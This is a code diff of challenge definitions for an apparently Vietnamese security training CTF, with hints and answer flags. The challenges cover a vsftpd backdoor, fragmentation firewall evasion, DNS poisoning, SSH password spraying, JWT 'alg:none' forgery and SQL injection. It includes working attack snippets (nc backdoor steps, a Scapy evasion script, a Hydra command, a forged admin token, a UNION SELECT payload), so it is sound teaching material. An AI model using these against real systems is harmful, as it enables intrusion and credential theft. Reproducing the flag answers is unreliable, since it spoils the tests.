+            3. Xác định địa chỉ BSSID và số hiệu cột CH của AP khả nghi.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{evil_twin_bssid_F8:E9:03:DD:AA:99_ch6}"
+                flag: "FLAG{B4:82:C5:99:11:AA_ch9}"
             },
 
             // =========================================================================
@@ -321,19 +344,19 @@ Rogue AP phát sóng với công suất cực mạnh (PWR -21 dBm) lấn át AP 
                 description: "Kiểm thử viên quét trinh sát thiết bị biên (Edge Firewall / DMZ Gateway) bằng Nmap. Kết quả phát hiện cổng FTP chạy phiên bản vsftpd 2.3.4 dính lỗ hổng backdoor nổi tiếng trong lịch sử an ninh mạng (CVE-2011-2523). Hãy xác định chuỗi ký tự kích hoạt backdoor và số hiệu cổng TCP root shell mở ra!",
                 codeSnippet: `$ nmap -sV -p 21,80,443 -Pn 203.0.113.88
 Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for gateway-dmz.techcorp.vn (203.0.113.88)
+Nmap scan report for edge-firewall.enterprise.vn (203.0.113.88)
 PORT    STATE SERVICE VERSION
 21/tcp  open  ftp     vsftpd 2.3.4
-| ftp-vsftpd-backdoor:
-|   VULNERABLE: vsftpd version 2.3.4 backdoor
-|   State: VULNERABLE (Exploitable)
-|   IDs:  CVE:CVE-2011-2523  BID:48539
-|   Description:
-|     When a username ending with ":)" is sent, vsftpd responds by opening a root shell on port 6200.
-80/tcp  open  http    nginx 1.18.0
-443/tcp open  ssl/http nginx 1.18.0
+80/tcp  open  http    Apache httpd 2.4.41
+443/tcp open  ssl/http Apache httpd 2.4.41
 
-Định dạng nộp cờ: FLAG{vsftpd_backdoor_trigger_:)}_port_6200}`,
+---
+YÊU CẦU:
+Dịch vụ FTP trên cổng 21 chạy phiên bản vsftpd 2.3.4 dính lỗ hổng backdoor nổi tiếng CVE-2011-2523:
+1. Chuỗi ký tự mặt cười gồm 2 ký tự ASCII nào gửi ở cuối tên người dùng (USER) sẽ kích hoạt backdoor?
+2. Số hiệu cổng TCP nào được dịch vụ tự động mở ra ở chế độ nền để trao root shell cho kẻ tấn công?
+Cú pháp cờ: FLAG{vsftpd_<ký_tự_mặt_cười>_port_<số_cổng>}
+(Ví dụ mẫu cú pháp: FLAG{vsftpd_:)_port_1234})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
@@ -341,8 +364,8 @@ PORT    STATE SERVICE VERSION
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
             • <b>Nmap NSE Script</b>: <code>nmap --script ftp-vsftpd-backdoor -p 21 &lt;target&gt;</code>.<br>
-            • <b>Metasploit Framework</b>: <code>use exploit/unix/ftp/vsftpd_234_backdoor</code>.<br>
-            • <b>Netcat</b>: <code>nc 203.0.113.88 21</code> -> Gửi <code>USER test:)</code> và <code>PASS pass</code> -> Kết nối <code>nc 203.0.113.88 6200</code>.
+            • <b>Metasploit Framework</b>: Tra cứu module <code>exploit/unix/ftp/vsftpd_234_backdoor</code>.<br>
+            • <b>Exploit Database / CVE Details</b>: Tra cứu thông tin chi tiết CVE-2011-2523.
         </div>
     </div>
     <div>
@@ -350,13 +373,13 @@ PORT    STATE SERVICE VERSION
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Tháng 7/2011, mã nguồn vsftpd 2.3.4 trên server lưu trữ chính thức bị hacker chèn mã độc ngầm.<br>
-            2. Mã độc kiểm tra chuỗi username; nếu kết thúc bằng mặt cười <b>:)</b>, daemon sẽ mở một socket lắng nghe trên cổng TCP <b>6200</b> trao quyền root.<br>
-            3. Cờ hoàn chỉnh: <code>FLAG{vsftpd_backdoor_trigger_:)}_port_6200}</code>.
+            1. Tháng 7/2011, mã nguồn vsftpd 2.3.4 bị chèn mã độc kiểm tra chuỗi username kết thúc bằng biểu tượng mặt cười quen thuộc (dấu hai chấm và ngoặc đóng).<br>
+            2. Cổng mở ngầm là một cổng TCP có 4 chữ số bắt đầu bằng số 62xx.<br>
+            3. Ghép nối 2 thông tin theo đúng định dạng cờ yêu cầu.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{vsftpd_backdoor_trigger_:)}_port_6200}"
+                flag: "FLAG{vsftpd_:)_port_6200}"
             },
             {
                 id: 8,
@@ -372,30 +395,29 @@ PORT    STATE SERVICE VERSION
 target_ip = "198.51.100.25"
 secret_port = 31337
 
-# Gói tin TCP SYN nguyên gốc có kích thước header 20 bytes IP + 20 bytes TCP
-# Pentester phân mảnh gói tin với kích thước 8 bytes (bội số của 8):
-# Fragment 1: Chứa 8 bytes đầu của TCP Header (Source Port, Dst Port một phần)
-frag1 = IP(dst=target_ip, id=1337, flags="MF", frag=0) / TCP(sport=49152, dport=secret_port, flags="S")[:8]
+# Pentester muốn gửi gói TCP SYN tới cổng bảo mật 31337 qua tường lửa Stateless.
+# Để che giấu cổng đích ở phân mảnh đầu, pentester cắt TCP Header tại byte thứ 8:
+frag0 = IP(dst=target_ip, id=4242, flags="MF", frag=0) / TCP(sport=50000, dport=secret_port, flags="S")[:8]
 
-# Fragment 2: Chứa 12 bytes còn lại của TCP Header (Flags, Window, Checksum)
-# Flags = 0 (Last fragment), Offset = 8 bytes / 8 = 1
-frag2 = IP(dst=target_ip, id=1337, flags=0, frag=1) / bytes(TCP(sport=49152, dport=secret_port, flags="S"))[8:]
+# Phân mảnh thứ hai chứa phần còn lại của TCP Header:
+frag1 = IP(dst=target_ip, id=4242, flags=0, frag=???) / bytes(TCP(sport=50000, dport=secret_port, flags="S"))[8:]
 
-send([frag1, frag2])
-# [FIREWALL LOG]:
-# PACKET PASS: IPID=1337, Frag 0, Protocol=TCP, Port filter: UNKNOWN L4 (Passed)
-# PACKET PASS: IPID=1337, Frag 1, Protocol=TCP, Non-zero offset (Passed without L4 inspection)
+send([frag0, frag1])
 
-Định dạng nộp cờ: FLAG{scapy_frag_offset_1_port_31337}`,
+---
+YÊU CẦU:
+Trong tiêu chuẩn RFC 791, trường Fragment Offset (frag) trong IP Header được tính theo khối 8 byte.
+Với phân mảnh thứ 2 bắt đầu từ byte thứ 8 của payload IP gốc, giá trị trường 'frag' bằng bao nhiêu?
+Cú pháp cờ: FLAG{frag_offset_<giá_trị>_target_port_<cổng>}
+(Ví dụ mẫu cú pháp: FLAG{frag_offset_2_target_port_80})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>Scapy (Python)</b>: Thư viện tạo và điều khiển gói tin tùy ý.<br>
-            • <b>Nmap Evasion</b>: <code>nmap -f &lt;target&gt;</code> (phân mảnh 8 bytes) hoặc <code>--mtu 16</code>.<br>
-            • <b>Wireshark Filter</b>: <code>ip.flags.mf == 1 || ip.frag_offset &gt; 0</code>.
+            • <b>Scapy (Python)</b>: Thư viện tạo gói tin mạng.<br>
+            • <b>RFC 791</b>: Tiêu chuẩn giao thức Internet Protocol (IPv4 Specification).
         </div>
     </div>
     <div>
@@ -403,14 +425,13 @@ send([frag1, frag2])
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Tường lửa Stateless (không lưu trạng thái phiên) chỉ kiểm tra số hiệu cổng L4 ở phân mảnh đầu tiên (offset = 0).<br>
-            2. Bằng cách đẩy cổng đích sang phân mảnh thứ 2 (Fragment Offset = 1 tương đương vị trí byte số 8), mảnh 0 bị khuyết cổng và mảnh 1 được cho qua vì không phải gói mở đầu.<br>
-            3. Giá trị Fragment Offset là <b>1</b> và cổng đích được bảo vệ là <b>31337</b>.<br>
-            4. Cờ: <code>FLAG{scapy_frag_offset_1_port_31337}</code>.
+            1. Trường Fragment Offset trong IPv4 Header được tính bằng: <code>Vị trí byte / 8</code>.<br>
+            2. Phân mảnh thứ hai bắt đầu tại vị trí byte thứ 8. Lấy 8 chia 8 ta được giá trị của <code>frag</code>.<br>
+            3. Cổng mục tiêu đang được gửi đến là cổng 31337.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{scapy_frag_offset_1_port_31337}"
+                flag: "FLAG{frag_offset_1_target_port_31337}"
             },
 
             // =========================================================================
@@ -426,27 +447,29 @@ send([frag1, frag2])
                 points: 150,
                 description: "Hệ thống Cổng thông tin tài chính bị hàng vạn IP ma từ Internet liên tục gửi các gói tin TCP SYN mà không gửi phản hồi ACK cuối cùng. Hàng đợi kết nối bán mở (SYN Backlog Queue) bị đầy nghẽn khiến người dùng hợp lệ bị từ chối phục vụ (DDoS). Quản trị viên cần kích hoạt cơ chế phòng vệ nào trong nhân Linux Kernel qua sysctl để chống lại đòn tấn công này?",
                 codeSnippet: `$ netstat -nat | grep SYN_RECV | wc -l
-65420  # [CẢNH BÁO]: Hàng chục ngàn kết nối kẹt ở trạng thái bán mở SYN_RECV!
+78450
 
-$ dmesg | tail -n 6
-[ 3210.109] TCP: request_sock_TCP: Possible SYN flooding on port 443. Dropping request.
-[ 3210.115] TCP: Possible SYN flooding on port 80. Dropping request.
-[ 3210.120] TCP: To mitigate, consider enabling TCP SYN Cookies in sysctl!
+$ dmesg | tail -n 4
+[ 4812.102] TCP: request_sock_TCP: Possible SYN flooding on port 443. Dropping request.
+[ 4812.108] TCP: SYN queue backlog is full! Legitimate clients unable to connect.
+[ 4812.115] TCP: Recommend enabling kernel protection mechanism in sysctl.
 
 $ sysctl net.ipv4.tcp_syncookies
 net.ipv4.tcp_syncookies = 0
 
-Nhiệm vụ: Tìm lệnh sysctl chính xác để bật vĩnh viễn tính năng SYN Cookies bảo vệ hệ thống.
-Định dạng nộp cờ: FLAG{sysctl_net.ipv4.tcp_syncookies=1}`,
+---
+YÊU CẦU:
+Để chống cạn kiệt bộ nhớ SYN Backlog mà không cần cấp phát socket nửa mở, quản trị viên cần thiết lập giá trị bằng 1 cho tham số kernel nào?
+Cú pháp cờ: FLAG{<tên_tham_số_sysctl>=1}
+(Ví dụ mẫu cú pháp: FLAG{net.ipv4.ip_forward=1})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>netstat / ss</b>: <code>ss -tan state syn-recv | wc -l</code> để đo mức độ nghẽn.<br>
-            • <b>tcpdump</b>: <code>tcpdump -nn -c 100 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0'</code>.<br>
-            • <b>Linux sysctl</b>: Cấu hình tham số kernel mạng tại <code>/etc/sysctl.conf</code>.
+            • <b>netstat / ss</b>: Giám sát trạng thái kết nối TCP (SYN_RECV).<br>
+            • <b>Linux sysctl</b>: Quản lý các biến tham số mạng trong kernel Linux.
         </div>
     </div>
     <div>
@@ -454,14 +477,12 @@ Nhiệm vụ: Tìm lệnh sysctl chính xác để bật vĩnh viễn tính năn
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Tấn công SYN Flood làm cạn kiệt tài nguyên bộ nhớ lưu trạng thái kết nối bán mở trong SYN Backlog.<br>
-            2. Cơ chế TCP SYN Cookies không lưu trạng thái vào RAM mà mã hóa thông tin kết nối trực tiếp vào số Sequence Number ban đầu của gói tin SYN-ACK phản hồi.<br>
-            3. Lệnh kích hoạt tính năng này trong kernel Linux: <code>sysctl net.ipv4.tcp_syncookies=1</code>.<br>
-            4. Cờ nộp: <code>FLAG{sysctl_net.ipv4.tcp_syncookies=1}</code>.
+            1. Xem lệnh <code>sysctl net.ipv4...</code> trong đoạn output ở trên.<br>
+            2. Tham số này hiện có giá trị là 0 (đang tắt). Để kích hoạt cơ chế SYN Cookies chống DDoS, cần gán giá trị bằng 1.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{sysctl_net.ipv4.tcp_syncookies=1}"
+                flag: "FLAG{net.ipv4.tcp_syncookies=1}"
             },
             {
                 id: 10,
@@ -471,33 +492,38 @@ Nhiệm vụ: Tìm lệnh sysctl chính xác để bật vĩnh viễn tính năn
                 category: "Tấn Công Hạ Tầng Internet (DNS Poisoning / Spoofing)",
                 difficulty: "Nâng cao",
                 points: 200,
-                description: "Kẻ tấn công trên mạng diện rộng WAN khai thác lỗi thiết kế DNS thời kỳ đầu (Kaminsky Bug) bằng cách bắn liên tục hàng ngàn gói tin DNS Response giả mạo với các Transaction ID (TXID) ngẫu nhiên để ghi đè bản ghi A của máy chủ ngân hàng ebank.vietbank.vn trỏ về máy chủ lừa đảo. Hãy phân tích đoạn log gói tin DNS Response trúng khớp TXID để xác định IP máy chủ lừa đảo!",
-                codeSnippet: `=== DNS Query sent by Resolver (Recursive Query) ===
-Transaction ID: 0x4e8a
-Questions: random9871.ebank.vietbank.vn: type A, class IN
+                description: "Kẻ tấn công trên mạng diện rộng WAN khai thác lỗi thiết kế DNS thời kỳ đầu (Kaminsky Bug) bằng cách bắn liên tục hàng ngàn gói tin DNS Response giả mạo với các Transaction ID (TXID) ngẫu nhiên để ghi đè bản ghi A của máy chủ ngân hàng vietbank.vn trỏ về máy chủ lừa đảo. Hãy phân tích đoạn log gói tin DNS Response trúng khớp TXID để xác định IP máy chủ lừa đảo!",
+                codeSnippet: `=== RECURSIVE DNS RESOLVER QUERY ===
+Resolver: 192.168.10.1:53210 -> Root/TLD DNS
+Question: a87b12.vietbank.vn (Type A, Class IN)
+Generated TXID: 0x9c4e
 
-=== Injected Forged DNS Response from Attacker ===
-Transaction ID: 0x4e8a  <--- [TXID MATCHED! INJECTION SUCCESSFUL]
-Flags: 0x8180 (Standard query response, No error)
-Questions: random9871.ebank.vietbank.vn: type A, class IN
+=== INTERCEPTED SPOOFED RESPONSE INJECTED BY ATTACKER ===
+Transaction ID: 0x9c4e  [MATCHED!]
+Flags: 0x8180 (Standard response, No error)
+Questions: a87b12.vietbank.vn: type A
 Answers:
-    random9871.ebank.vietbank.vn: type A, class IN, TTL 30, addr 185.220.101.99
+    a87b12.vietbank.vn: type A, TTL 30, addr 185.220.101.55
 Authoritative nameservers:
-    vietbank.vn: type NS, class IN, TTL 86400, ns.evil-phish-ns.com
+    vietbank.vn: type NS, TTL 86400, ns.attacker-controlled-dns.com
 Additional records:
-    ns.evil-phish-ns.com: type A, class IN, TTL 86400, addr 185.220.101.99
-    ebank.vietbank.vn: type A, class IN, TTL 86400, addr 185.220.101.99  <-- [POISONED CACHE!]
+    ns.attacker-controlled-dns.com: type A, TTL 86400, addr 185.220.101.55
+    vietbank.vn: type A, TTL 86400, addr 194.26.29.88  <-- [POISONED ENTRY]
 
-Định dạng cờ: FLAG{dns_poisoned_txid_0x4e8a_ip_185.220.101.99}`,
+---
+YÊU CẦU:
+1. Xác định giá trị Transaction ID (TXID) dạng thập lục phân (có tiền tố 0x).
+2. Xác định địa chỉ IPv4 độc hại được kẻ tấn công gán cho tên miền chính 'vietbank.vn' trong phần Additional records để đầu độc cache.
+Cú pháp cờ: FLAG{txid_<giá_trị_hex>_ip_<IP_đầu_độc>}
+(Ví dụ mẫu cú pháp: FLAG{txid_0x12ab_ip_1.2.3.4})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>Wireshark Filter</b>: <code>dns.flags.response == 1 && dns.id == 0x4e8a</code>.<br>
-            • <b>Dig / Nslookup</b>: <code>dig @resolver ebank.vietbank.vn +trace</code>.<br>
-            • <b>Scapy DNS module</b>: Tạo gói tin DNS Response giả mạo với bản ghi Additional authority.
+            • <b>Wireshark DNS filter</b>: <code>dns.flags.response == 1 && dns.id</code>.<br>
+            • <b>Dig CLI</b>: <code>dig @resolver vietbank.vn +trace</code>.
         </div>
     </div>
     <div>
@@ -505,13 +531,13 @@ Additional records:
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Cuộc tấn công Dan Kaminsky gửi các truy vấn subdomain ngẫu nhiên để vượt qua cache và kích hoạt Resolver gửi truy vấn ra bên ngoài.<br>
-            2. Khi kẻ tấn công gửi phản hồi giả mạo trùng khớp Transaction ID <b>0x4e8a</b>, phần Additional Records chứa ánh xạ độc hại trỏ ebank.vietbank.vn về IP <b>185.220.101.99</b>.<br>
-            3. Ghép nối thành cờ: <code>FLAG{dns_poisoned_txid_0x4e8a_ip_185.220.101.99}</code>.
+            1. Tìm trường <code>Transaction ID</code> trong gói tin Response giả mạo đã khớp với TXID của truy vấn ban đầu.<br>
+            2. Trong phần <code>Additional records</code>, tìm bản ghi loại A gán địa chỉ IP độc hại cho tên miền <code>vietbank.vn</code>.<br>
+            3. Ghép nối 2 thông tin theo đúng cú pháp cờ yêu cầu.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{dns_poisoned_txid_0x4e8a_ip_185.220.101.99}"
+                flag: "FLAG{txid_0x9c4e_ip_194.26.29.88}"
             },
 
             // =========================================================================
@@ -526,24 +552,29 @@ Additional records:
                 difficulty: "Trung bình",
                 points: 150,
                 description: "Máy chủ SSH nội bộ mở cổng 22 ra ngoài Internet để nhân viên làm việc từ xa (Work From Home). Kẻ tấn công sử dụng công cụ Hydra thực hiện cuộc tấn công rải mật khẩu (Password Spraying) với mật khẩu phổ biến 'Welcome@2026' nhằm tránh kích hoạt cơ chế khóa tài khoản. Hãy phân tích file nhật ký xác thực /var/log/auth.log để tìm tài khoản nhân viên duy nhất bị bẻ khóa và địa chỉ IP của kẻ tấn công!",
-                codeSnippet: `Nov 20 02:45:01 bastion-ssh sshd[31012]: Failed password for invalid user admin from 203.0.113.195 port 51102 ssh2
-Nov 20 02:45:04 bastion-ssh sshd[31015]: Failed password for user it_support from 203.0.113.195 port 51104 ssh2
-Nov 20 02:45:08 bastion-ssh sshd[31018]: Failed password for user accounting from 203.0.113.195 port 51106 ssh2
-Nov 20 02:45:12 bastion-ssh sshd[31021]: Failed password for user dev_lead from 203.0.113.195 port 51108 ssh2
-Nov 20 02:45:15 bastion-ssh sshd[31024]: Accepted password for user remote_vpn_user from 203.0.113.195 port 51110 ssh2
-Nov 20 02:45:16 bastion-ssh sshd[31024]: pam_unix(sshd:session): session opened for user remote_vpn_user by (uid=0)
+                codeSnippet: `Nov 20 02:45:01 srv-ssh sshd[4102]: Failed password for invalid user admin from 198.51.100.142 port 48102 ssh2
+Nov 20 02:45:03 srv-ssh sshd[4105]: Failed password for user it_helpdesk from 198.51.100.142 port 48104 ssh2
+Nov 20 02:45:06 srv-ssh sshd[4108]: Failed password for user accountant from 198.51.100.142 port 48106 ssh2
+Nov 20 02:45:09 srv-ssh sshd[4111]: Failed password for user sysadmin from 198.51.100.142 port 48108 ssh2
+Nov 20 02:45:12 srv-ssh sshd[4115]: Accepted password for user remote_devops from 198.51.100.142 port 48110 ssh2
+Nov 20 02:45:13 srv-ssh sshd[4115]: pam_unix(sshd:session): session opened for user remote_devops by (uid=0)
+Nov 20 02:45:16 srv-ssh sshd[4120]: Failed password for user tester from 198.51.100.142 port 48112 ssh2
 
-Nhiệm vụ: Trích xuất tên người dùng bị bẻ khóa và IP nguồn của kẻ tấn công.
-Định dạng nộp cờ: FLAG{hydra_spray_user_<Username>_ip_<IP>}`,
+---
+YÊU CẦU:
+Kiểm toán nhật ký xác thực trên để xác định:
+1. Tên tài khoản người dùng duy nhất bị đăng nhập thành công
+2. Địa chỉ IP của kẻ tấn công đang thực hiện Password Spraying
+Cú pháp cờ: FLAG{user_<tên_user>_ip_<IP_Attacker>}
+(Ví dụ mẫu cú pháp: FLAG{user_john_ip_10.20.30.40})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>Linux CLI</b>: <code>grep "Accepted password" /var/log/auth.log</code>.<br>
-            • <b>THChydra</b>: <code>hydra -L users.txt -p 'Welcome@2026' ssh://target.com</code>.<br>
-            • <b>Fail2ban</b>: Công cụ phân tích log và tự động drop IP sau N lần thất bại.
+            • <b>Linux CLI</b>: <code>grep "Accepted" /var/log/auth.log</code>.<br>
+            • <b>Fail2ban</b>: Công cụ phòng chống tấn công brute-force SSH.
         </div>
     </div>
     <div>
@@ -551,14 +582,13 @@ Nhiệm vụ: Trích xuất tên người dùng bị bẻ khóa và IP nguồn c
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Tấn công Password Spraying thử một mật khẩu chung cho nhiều user để lách qua Account Lockout threshold.<br>
-            2. Dòng log thành công duy nhất ghi rõ: <code>Accepted password for user remote_vpn_user from 203.0.113.195</code>.<br>
-            3. Tài khoản bị thỏa hiệp là <b>remote_vpn_user</b> từ địa chỉ IP <b>203.0.113.195</b>.<br>
-            4. Cờ: <code>FLAG{hydra_spray_user_remote_vpn_user_ip_203.0.113.195}</code>.
+            1. Cuộc tấn công Password Spraying tạo ra rất nhiều dòng log <code>Failed password</code>.<br>
+            2. Tìm dòng duy nhất ghi nhận đăng nhập thành công với từ khóa <code>Accepted password for user ... from ...</code>.<br>
+            3. Trích xuất chính xác username và IP nguồn của kẻ tấn công.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{hydra_spray_user_remote_vpn_user_ip_203.0.113.195}"
+                flag: "FLAG{user_remote_devops_ip_198.51.100.142}"
             },
             {
                 id: 12,
@@ -569,36 +599,29 @@ Nhiệm vụ: Trích xuất tên người dùng bị bẻ khóa và IP nguồn c
                 difficulty: "Nâng cao",
                 points: 200,
                 description: "Cổng truy nhập từ xa SSL-VPN sử dụng JSON Web Token (JWT) trong Cookie để duy trì phiên làm việc của nhân viên. Bạn đăng nhập với tài khoản khách (role: guest). Máy chủ phía backend sử dụng thư viện JWT chưa vá lỗi kiểm tra chữ ký khi thuật toán đặt là 'none'. Hãy tạo token giả mạo với quyền quản trị viên tối cao role: admin!",
-                codeSnippet: `// Token ban đầu của bạn (Signed with HS256):
-// Header:  {"alg": "HS256", "typ": "JWT"}
-// Payload: {"user": "viewview", "role": "guest", "iat": 1794840000}
+                codeSnippet: `=== RAW JWT TOKEN NHẬN ĐƯỢC TỪ COOKIE ===
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoia2hhY2hoYW5nIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTQ4NDAwMDB9.i_DcxLgU-3N9S_01Yp69GZJmQOq8Q0rK9uO1r-8Lh3M
 
-// Yêu cầu giả mạo (JWT none algorithm attack):
-// Header mới:
-{
-  "alg": "none",
-  "typ": "JWT"
-}
-// Payload mới:
-{
-  "user": "root_admin",
-  "role": "admin",
-  "iat": 1794840000
-}
+---
+YÊU CẦU:
+Máy chủ VPN bị lỗ hổng chấp nhận thuật toán "none" (CVE-2015-9235).
+1. Giải mã token trên để kiểm tra cấu trúc Header và Payload.
+2. Giả mạo Header mới với thuật toán "none" (chữ thường): {"alg":"none","typ":"JWT"}
+3. Giả mạo Payload mới nâng quyền hạn: {"user":"administrator","role":"admin","iat":1794840000}
+4. Mã hóa Base64URL Header và Payload mới, ghép lại theo chuẩn JWT (Header.Payload.) với phần chữ ký để trống (kết thúc bằng dấu chấm .).
 
-// Lưu ý: Token có alg "none" không cần phần Signature, kết thúc bằng dấu chấm:
-// eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoicm9vdF9hZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDg0MDAwMH0.
-
-Định dạng nộp cờ: FLAG{jwt_alg_none_root_admin_pwned}`,
+Cú pháp cờ: Nộp toàn bộ chuỗi JWT giả mạo kết thúc bằng dấu chấm:
+FLAG{<jwt_token_bỏ_chữ_ký>}
+(Gợi ý: Header {"alg":"none","typ":"JWT"} mã hóa Base64URL là: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0)`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>jwt.io Debugger</b>: Trực quan hóa và chỉnh sửa Header/Payload token.<br>
-            • <b>Burp Suite Extension</b>: JSON Web Tokens (JWT Editor).<br>
-            • <b>CyberChef</b>: Recipe <code>To Base64URL</code> cho Header và Payload.
+            • <b>jwt.io Debugger</b>: Phân tích và chỉnh sửa token trực quan.<br>
+            • <b>NETLAB Terminal</b>: Lệnh <code>b64 encode &lt;chuỗi_json&gt;</code>.<br>
+            • <b>CyberChef</b>: Recipe <code>To Base64URL</code>.
         </div>
     </div>
     <div>
@@ -606,13 +629,13 @@ Nhiệm vụ: Trích xuất tên người dùng bị bẻ khóa và IP nguồn c
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Chuẩn RFC 7515 hỗ trợ giá trị thuật toán <code>"alg": "none"</code> cho trường hợp token không cần ký xác thực.<br>
-            2. Nếu server không ép buộc thuật toán HS256/RS256, kẻ tấn công có thể thay đổi Header thành <code>alg: none</code> và sửa Payload thành quyền <code>admin</code>.<br>
-            3. Cờ chứng minh thành công: <code>FLAG{jwt_alg_none_root_admin_pwned}</code>.
+            1. Mã hóa Base64URL chuỗi Payload: <code>{"user":"administrator","role":"admin","iat":1794840000}</code>.<br>
+            2. Ghép với Header đã cho: <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.&lt;Base64URL_Payload&gt;.</code>.<br>
+            3. Lưu ý token JWT khi bỏ chữ ký vẫn bắt buộc phải có dấu chấm <code>.</code> ở cuối cùng.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{jwt_alg_none_root_admin_pwned}"
+                flag: "FLAG{eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW5pc3RyYXRvciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDg0MDAwMH0.}"
             },
 
             // =========================================================================
@@ -626,30 +649,30 @@ Nhiệm vụ: Trích xuất tên người dùng bị bẻ khóa và IP nguồn c
                 category: "Tấn Công Ứng Dụng Web (SQL Injection / Data Exfiltration)",
                 difficulty: "Nâng cao",
                 points: 200,
-                description: "Ứng dụng web Cổng thông tin doanh nghiệp nội bộ có tham số tìm kiếm nhân sự employee.php?id=1 dính lỗi SQL Injection do nối chuỗi thô. Kẻ tấn công sử dụng kỹ thuật UNION-Based để nối bảng users và trích xuất chuỗi mã băm mật khẩu MD5 của tài khoản admin. Hãy crack hash để tìm mật khẩu cờ dạng rõ!",
-                codeSnippet: `-- Request gửi đến máy chủ:
-GET /employee.php?id=-1' UNION SELECT 1, group_concat(username, 0x3a, password_hash), 3 FROM users-- - HTTP/1.1
-Host: portal.corp.local
+                description: "Ứng dụng web Cổng thông tin doanh nghiệp nội bộ có tham số tìm kiếm nhân sự profile.php?id=1 dính lỗi SQL Injection do nối chuỗi thô. Kẻ tấn công sử dụng kỹ thuật UNION-Based để nối bảng admin_users và trích xuất chuỗi mã băm mật khẩu MD5 của tài khoản root_admin. Hãy crack hash để tìm mật khẩu cờ dạng rõ!",
+                codeSnippet: `-- Pentester khai thác lỗ hổng UNION SELECT trên cổng thông tin nội bộ:
+GET /profile.php?id=-1' UNION SELECT 1, group_concat(username, 0x3a, pass_hash), 3 FROM admin_users-- - HTTP/1.1
+Host: secure-portal.internal
 
--- Dữ liệu hiển thị trả về trên trang web:
-<div>
-   <h3>Thông tin nhân sự:</h3>
-   <p>Kết quả trích xuất: <b>admin:e10adc3949ba59abbe56e057f20f883e</b></p>
-</div>
+-- Dữ liệu hiển thị trích xuất trên giao diện web:
+[DB_DUMP_OUTPUT]:
+root_admin:482c811da5d5b4bc6d497ffa98491e38
 
--- Nhiệm vụ:
--- 1. Xác định thuật toán băm của chuỗi 32 ký tự hex (MD5).
--- 2. Bẻ khóa mật khẩu dạng rõ từ chuỗi băm e10adc3949ba59abbe56e057f20f883e.
--- Định dạng cờ: FLAG{sqli_union_admin_plaintext_<mật_khẩu>}`,
+---
+YÊU CẦU:
+1. Xác định mật khẩu gốc dạng rõ (plaintext) sau khi giải mã chuỗi băm MD5 32 ký tự hex:
+   482c811da5d5b4bc6d497ffa98491e38
+Cú pháp cờ: FLAG{<mật_khẩu_admin_sau_khi_crack>}
+(Ví dụ mẫu cú pháp: FLAG{admin123})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
